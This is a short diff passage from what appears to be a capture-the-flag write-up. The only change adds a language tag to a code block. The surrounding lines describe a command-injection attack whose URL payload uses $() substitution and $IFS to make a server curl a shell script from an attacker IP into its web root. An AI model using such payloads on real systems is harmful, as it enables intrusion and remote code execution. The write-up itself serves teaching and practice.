@@ -20,7 +20,7 @@ category: writeup
 first you will need to curl in a bash  payload and save to `/var/www/html`. next you will need to run it, so the payloads should look something like this:
 
 
-```
+```bash
 # first payload
 http://IP/$('curl'$IFS'http://IP/shell.sh'$IFS'-o'$IFS'/var/www/html/shell.sh')
 
